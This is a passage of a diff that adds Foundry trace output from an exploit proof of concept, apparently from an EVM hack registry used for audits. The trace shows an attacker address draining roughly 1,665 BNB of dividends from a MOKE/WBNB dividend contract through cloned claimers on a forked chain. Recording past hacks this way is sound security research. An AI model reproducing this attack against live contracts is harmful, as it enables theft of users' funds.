+    │   │   ├─ [537] MOKE/WBNB LP::balanceOf(Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a]) [staticcall]
+    │   │   │   └─ ← [Return] 1334183807563777105758 [1.334e21]
+    │   │   ├─ [0] Attacker EOA::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a], param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1caee34e2b5a5f65b7d6e2acc49c7324aeec365e4fce52f8a773cee83cd6df44: 0 → 0x0000000000000000000000000000000000000000000000015f688bbdb1f1d7a3
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Claimed via clones (BNB)", val: 1639294828337604995436 [1.639e21], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker profit (BNB)", val: 1665616470889346105615 [1.665e21], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Dividend contract leftover", val: 49339 [4.933e4], decimals: 18)
+    ├─ [0] VM::assertGt(1665616470889346105615 [1.665e21], 1500000000000000000000 [1.5e21], "expected >1500 BNB profit") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertLt(49339 [4.933e4], 1000000000000000000 [1e18], "dividend contract should be nearly empty") [staticcall]
+    │   └─ ← [Return]
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit BNB Balance", val: 1665616470889346105615 [1.665e21], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 68.13ms (54.97ms CPU time)
+
+Ran 1 test suite in 2.57s (68.13ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+/workspaces/RustroverProjects/audits/evm-hack-registry/_shared/run-poc/run_poc.sh: line 71: 37395 Killed                  nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: /workspaces/RustroverProjects/audits/evm-hack-registry/2026-08-MOKE_exp)
